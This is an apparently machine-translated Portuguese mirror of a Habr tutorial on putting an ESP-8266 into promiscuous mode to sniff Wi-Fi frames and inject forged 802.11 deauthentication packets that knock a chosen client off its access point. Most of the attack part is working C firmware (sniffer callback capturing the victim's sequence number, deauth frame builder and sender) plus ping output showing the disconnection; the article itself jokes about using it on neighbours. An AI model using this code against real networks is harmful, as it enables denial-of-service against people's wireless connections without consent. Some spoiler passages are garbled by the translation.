<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🔵 🉐 ⬆️ Modo promíscuo no microcontrolador ESP-8266 🤠 👵🏼 🤐</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Eu acho que muitos concordam que o ESP-8266 é uma grande invenção para DIY e a Internet das coisas. Um tipo de sensor WiFi que pode ser conectado ao A...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Modo promíscuo no microcontrolador ESP-8266</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/397741/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Eu acho que muitos concordam que o ESP-8266 é uma grande invenção para DIY e a Internet das coisas. Um tipo de sensor WiFi que pode ser conectado ao Arduino ou até usado em vez do Arduino para enviar, via de regra, dados meteorológicos ao servidor. Existem muitos firmwares diferentes que permitem fazer isso: desde o </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">modem de</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> estoque </font><font style="vertical-align: inherit;">usado em conjunto com o Arduino, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NodeMCU</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> para seguidores da LUA, até vários servidores da Web totalmente atendidos pelo ESP ( </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exemplo</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ). </font></font><br>
<br>
<img src="https://espressif.com/sites/default/files/banner_28.jpg" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como regra, depois de receber um microcontrolador em miniatura da China, é improvável que você queira escrever seu próprio firmware e usará um dos disponíveis. Há duas razões para isso: não importa o que você pensa, ele já </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">foi implementado</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e é improvável que você queira lidar com o SDK chinês temperado generosamente com muletas e recursos não documentados. E não se confunda com o </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">design atraente do site</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> : escrever firmware para ESP é doloroso. Se isso não assustar você, então seja bem-vindo. O artigo é voltado para o arduino com experiência mínima em ESP: você </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">já</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> sabe coletar firmware e escrevê-lo no microcontrolador.</font></font><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como você pode ver no cabeçalho, trabalharemos diretamente com a pilha 802.11, tanto quanto possível no caso do ESP. </font><font style="vertical-align: inherit;">Modo promíscuo no ESP - a capacidade de enviar e receber pacotes de dados "alienígenas" do ar. </font><font style="vertical-align: inherit;">Não existem muitas áreas de aplicação: análise estatística (coleta de todos os tipos de dados, como congestionamentos dependendo da frequência) e penetração e invasão de redes. </font><font style="vertical-align: inherit;">Neste último caso, um passatempo típico de script infantil é a desautenticação (desconexão) de um vizinho de seu roteador WiFi enquanto ele joga DotA / tanques. </font><font style="vertical-align: inherit;">Normalmente, para isso, a cabeça brilhante instala o Kali Linux e usa o conjunto de pulos air * -ng; usaremos um controlador em miniatura.</font></font><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Porque</font></font></b><div class="spoiler_text">  , .<br>
<br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para isso, além do hardware, precisaremos de uma </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">API</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (usei a </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Referência da API do SDK</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> do </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;">ESP8266 que não é do SO</font></a><font style="vertical-align: inherit;"> , o link poderá se romper muito em breve) e um maravilhoso projeto </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">esp-open-sdk</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> que fará a maior parte da montagem do projeto para você. Um projeto semi-acabado (por razões éticas) com base nos resultados desta publicação pode ser encontrado no </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">github</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Então deauth. Quem não sabe - </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">interrompa</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sua conexão WiFi é possível usando algumas dezenas de bytes de dados enviados ao ar nas proximidades. </font><font style="vertical-align: inherit;">A criptografia não salva por razões puramente conceituais: o deauth é fornecido nos casos em que a comunicação é ruim e os pacotes são perdidos. </font><font style="vertical-align: inherit;">Portanto, é necessário um mecanismo eficaz para gritar para o cliente "Estou cansado de tudo" e iniciar a conexão do zero. </font><font style="vertical-align: inherit;">E aqui não depende de criptografia. </font><font style="vertical-align: inherit;">No nosso caso, fingiremos que o ponto de acesso não aguentou e, em nome dele, enviaremos uma carta ao cliente satisfeito. </font><font style="vertical-align: inherit;">A estrutura do pacote é a seguinte:</font></font><br>
<br>
<pre><code class="python hljs">[<span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">0x00</span></span>] + two_random_bytes + client_MAC_address + (ap_MAC_address * <span class="hljs-number"><span class="hljs-number">2</span></span>) + [seq_N_lo] + [seq_N_hi] + [<span class="hljs-number"><span class="hljs-number">0x01</span></span>, <span class="hljs-number"><span class="hljs-number">0x00</span></span>]
</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O próprio ganancioso por conhecimento </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">encontrará o</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> que significam constantes mágicas, mas descreverei brevemente as variáveis:</font></font><br>
<br>
<ul>
<li><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">two_random_bytes</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> serão substituídos pelo microcontrolador;</font></font></li>
<li><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">client_MAC_address</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 6 bytes do endereço físico do dispositivo MAC do cliente;</font></font></li>
<li><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ap_MAC_address</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 6 bytes do endereço físico do dispositivo MAC do servidor (roteador, ponto de acesso);</font></font></li>
<li><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">seq_N_lo, oi</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> alto e baixo bytes de seq_n, número de série do pacote multiplicado por 16 (os 4 bits menos significativos são reservados para a possibilidade de enviar o mesmo pacote novamente)</font></font></li>
</ul><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Então</font></font><br>
<br>
<h5><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Etapa 1: coloque o ESP no modo de estação</font></font></h5><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Após comentários discretos de amigos chineses, isso é simplesmente necessário (sem explicação).</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> ICACHE_FLASH_ATTR
</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">user_init</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">
</span></span>{<font></font>
    uart_init(<span class="hljs-number"><span class="hljs-number">115200</span></span>, <span class="hljs-number"><span class="hljs-number">115200</span></span>);<font></font>
    os_printf(<span class="hljs-string"><span class="hljs-string">"\n\nSDK version:%s\n"</span></span>, system_get_sdk_version());<font></font>
    <font></font>
    <span class="hljs-comment"><span class="hljs-comment">// Promiscuous works only with station mode</span></span><font></font>
    wifi_set_opmode(STATION_MODE);<font></font>
    <font></font>
    <span class="hljs-comment"><span class="hljs-comment">// Set timer for deauth</span></span><font></font>
    os_timer_disarm(&amp;deauth_timer);<font></font>
    os_timer_setfn(&amp;deauth_timer, (<span class="hljs-keyword"><span class="hljs-keyword">os_timer_func_t</span></span> *) deauth, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);<font></font>
    os_timer_arm(&amp;deauth_timer, DEAUTH_INTERVAL, <span class="hljs-number"><span class="hljs-number">1</span></span>);<font></font>
    <font></font>
    <span class="hljs-comment"><span class="hljs-comment">// Continue to 'sniffer_system_init_done'</span></span><font></font>
    system_init_done_cb(sniffer_system_init_done);<font></font>
}</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Entre outras coisas, definimos a velocidade de entrada / saída da série aqui para poder ler mensagens de depuração, usar o timer interno para chamar o método deauth a cada DEAUTH_INTERVAL milissegundos e deixar o ESP farfalhar antes de prosseguir para o segundo estágio de inicialização.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Porque</font></font></b><div class="spoiler_text"> , user-defined    ESP      ,  WiFi      ,     .     while(1)   watchdog  .<br>
</div></div><br>
<br>
<h5><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Etapa 2: coloque o ESP no modo promíscuo</font></font></h5><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para isso, definimos a função sniffer_system_init_done que foi usada anteriormente.</font></font><br>
<pre><code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> ICACHE_FLASH_ATTR
</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sniffer_system_init_done</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
</span></span>{
    <span class="hljs-comment"><span class="hljs-comment">// Set up promiscuous callback</span></span><font></font>
    wifi_set_channel(channel);<font></font>
    wifi_promiscuous_enable(<span class="hljs-number"><span class="hljs-number">0</span></span>);<font></font>
    wifi_set_promiscuous_rx_cb(promisc_cb);<font></font>
    wifi_promiscuous_enable(<span class="hljs-number"><span class="hljs-number">1</span></span>);<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqui, configuramos a banda WiFi (canal de transmissão / recepção de dados, consulte as instruções para o seu país), registramos o retorno de chamada para receber pacotes promisc_cb e executamos o modo promíscuo. </font><font style="vertical-align: inherit;">Por que precisamos desse retorno de chamada?</font></font><br>
<br>
<h5><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Etapa 3: farejar os pacotes</font></font></h5><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Um dos parâmetros deauth do pacote, seq_n, implica que recebemos pacotes anteriores e sabemos o número de série do próximo. </font><font style="vertical-align: inherit;">Para isso, precisamos ouvir a conexão de outra pessoa e gravar este seq_n.</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> ICACHE_FLASH_ATTR
</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">promisc_cb</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">uint8_t</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *buf, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">uint16_t</span></span></span></span><span class="hljs-function"><span class="hljs-params"> len)</span></span></span><span class="hljs-function">
</span></span>{
    <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (len == <span class="hljs-number"><span class="hljs-number">12</span></span>){
        <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">RxControl</span></span></span><span class="hljs-class"> *</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">sniffer</span></span></span><span class="hljs-class"> = (</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">RxControl</span></span></span><span class="hljs-class">*) </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">buf</span></span></span><span class="hljs-class">;</span></span>
    } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (len == <span class="hljs-number"><span class="hljs-number">128</span></span>) {<font></font>
        struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;<font></font>
    } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {<font></font>
        struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;<font></font>
        <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i=<span class="hljs-number"><span class="hljs-number">0</span></span>;
        <span class="hljs-comment"><span class="hljs-comment">// Check MACs</span></span>
        <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (i=<span class="hljs-number"><span class="hljs-number">0</span></span>; i&lt;<span class="hljs-number"><span class="hljs-number">6</span></span>; i++) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (sniffer-&gt;buf[i+<span class="hljs-number"><span class="hljs-number">4</span></span>] != client[i]) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>;
        <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (i=<span class="hljs-number"><span class="hljs-number">0</span></span>; i&lt;<span class="hljs-number"><span class="hljs-number">6</span></span>; i++) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (sniffer-&gt;buf[i+<span class="hljs-number"><span class="hljs-number">10</span></span>] != ap[i]) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>;
        <span class="hljs-comment"><span class="hljs-comment">// Update sequence number</span></span>
        seq_n = sniffer-&gt;buf[<span class="hljs-number"><span class="hljs-number">23</span></span>] * <span class="hljs-number"><span class="hljs-number">0xFF</span></span> + sniffer-&gt;buf[<span class="hljs-number"><span class="hljs-number">22</span></span>];<font></font>
    }<font></font>
}<font></font>
</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A cascata de ifs está associada à </font></font><s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">magia negra com uma</font></font></s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> variedade de padrões 802.11. </font><font style="vertical-align: inherit;">Obviamente, o ESP suporta apenas o conjunto mais necessário e não funciona, digamos, com uma frequência de 5Ghz. </font><font style="vertical-align: inherit;">Descrições de todas as estruturas estão disponíveis na documentação e nos exemplos, mas precisamos de uma pequena: o campo de dados sniffer-&gt; buf neste caso. </font><font style="vertical-align: inherit;">Verificamos que o pacote veio do ponto de acesso e foi enviado à nossa vítima e, nesse caso, escrevemos 2 bytes de seq_n. </font><font style="vertical-align: inherit;">A propósito, pacotes na direção oposta têm uma numeração separada.</font></font><br>
<br>
<h5><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Etapa 4: enviar</font></font></h5><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A única coisa é enviar o pacote.</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">uint16_t</span></span> deauth_packet(<span class="hljs-keyword"><span class="hljs-keyword">uint8_t</span></span> *buf, <span class="hljs-keyword"><span class="hljs-keyword">uint8_t</span></span> *client, <span class="hljs-keyword"><span class="hljs-keyword">uint8_t</span></span> *ap, <span class="hljs-keyword"><span class="hljs-keyword">uint16_t</span></span> seq)<font></font>
{<font></font>
    <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i=<span class="hljs-number"><span class="hljs-number">0</span></span>;<font></font>
    <font></font>
    <span class="hljs-comment"><span class="hljs-comment">// Type: deauth</span></span>
    buf[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0xC0</span></span>;<font></font>
    buf[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0x00</span></span>;
    <span class="hljs-comment"><span class="hljs-comment">// Duration 0 msec, will be re-written by ESP</span></span>
    buf[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0x00</span></span>;<font></font>
    buf[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0x00</span></span>;
    <span class="hljs-comment"><span class="hljs-comment">// Destination</span></span>
    <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (i=<span class="hljs-number"><span class="hljs-number">0</span></span>; i&lt;<span class="hljs-number"><span class="hljs-number">6</span></span>; i++) buf[i+<span class="hljs-number"><span class="hljs-number">4</span></span>] = client[i];
    <span class="hljs-comment"><span class="hljs-comment">// Sender</span></span>
    <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (i=<span class="hljs-number"><span class="hljs-number">0</span></span>; i&lt;<span class="hljs-number"><span class="hljs-number">6</span></span>; i++) buf[i+<span class="hljs-number"><span class="hljs-number">10</span></span>] = ap[i];
    <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (i=<span class="hljs-number"><span class="hljs-number">0</span></span>; i&lt;<span class="hljs-number"><span class="hljs-number">6</span></span>; i++) buf[i+<span class="hljs-number"><span class="hljs-number">16</span></span>] = ap[i];
    <span class="hljs-comment"><span class="hljs-comment">// Seq_n</span></span>
    buf[<span class="hljs-number"><span class="hljs-number">22</span></span>] = seq % <span class="hljs-number"><span class="hljs-number">0xFF</span></span>;<font></font>
    buf[<span class="hljs-number"><span class="hljs-number">23</span></span>] = seq / <span class="hljs-number"><span class="hljs-number">0xFF</span></span>;
    <span class="hljs-comment"><span class="hljs-comment">// Deauth reason</span></span>
    buf[<span class="hljs-number"><span class="hljs-number">24</span></span>] = <span class="hljs-number"><span class="hljs-number">1</span></span>;<font></font>
    buf[<span class="hljs-number"><span class="hljs-number">25</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>;
    <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">26</span></span>;<font></font>
}<font></font>
<font></font>
<span class="hljs-comment"><span class="hljs-comment">/* Sends deauth packets. */</span></span>
<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">deauth</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *arg)</span></span></span><span class="hljs-function">
</span></span>{<font></font>
    os_printf(<span class="hljs-string"><span class="hljs-string">"\nSending deauth seq_n = %d ...\n"</span></span>, seq_n/<span class="hljs-number"><span class="hljs-number">0x10</span></span>);
    <span class="hljs-comment"><span class="hljs-comment">// Sequence number is increased by 16, see 802.11</span></span>
    <span class="hljs-keyword"><span class="hljs-keyword">uint16_t</span></span> size = deauth_packet(packet_buffer, client, ap, seq_n+<span class="hljs-number"><span class="hljs-number">0x10</span></span>);<font></font>
    wifi_send_pkt_freedom(packet_buffer, size, <span class="hljs-number"><span class="hljs-number">0</span></span>);<font></font>
}<font></font>
</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A primeira função grava os dados necessários no buffer, a segunda os envia.</font></font><br>
<br>
<h5><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Etapa 5: verificar</font></font></h5><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para testar o desempenho, usei </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meu próprio</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> computador.</font></font><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Os resultados falam por si</font></font></b><div class="spoiler_text"><pre><code class="bash hljs">PING 192.168.2.1 (192.168.2.1) 56(84) bytes of data.<font></font>
64 bytes from 192.168.2.1: icmp_seq=1 ttl=64 time=71.5 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=2 ttl=64 time=3.24 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=3 ttl=64 time=0.754 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=4 ttl=64 time=0.648 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=5 ttl=64 time=0.757 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=6 ttl=64 time=0.822 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=7 ttl=64 time=0.734 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=8 ttl=64 time=0.759 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=9 ttl=64 time=0.739 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=10 ttl=64 time=0.772 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=11 ttl=64 time=0.732 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=12 ttl=64 time=0.739 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=13 ttl=64 time=0.740 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=14 ttl=64 time=0.621 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=15 ttl=64 time=2.19 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=16 ttl=64 time=0.710 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=17 ttl=64 time=0.740 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=18 ttl=64 time=0.742 ms<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=19<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=20<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=21<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=22<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=23<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=24<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=25<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=26<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=27<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=28<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=29<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=30<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=31<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=32<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=33<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=34<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=35<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=36<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=37<font></font>
no answer yet <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> icmp_seq=38<font></font>
64 bytes from 192.168.2.1: icmp_seq=39 ttl=64 time=2.03 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=40 ttl=64 time=3.53 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=41 ttl=64 time=2.03 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=42 ttl=64 time=1.98 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=43 ttl=64 time=1.99 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=44 ttl=64 time=1.99 ms<font></font>
64 bytes from 192.168.2.1: icmp_seq=45 ttl=64 time=6.96 ms<font></font>
</code></pre><br>
</div></div><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para uma análise objetiva, você pode usar o Wireshark: </font></font><br>
<br>
<img src="https://habrastorage.org/files/457/8eb/54d/4578eb54df2449879e5b16043820e111.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O pacote é visível exatamente no formulário em que o enviamos. </font></font><br>
<br>
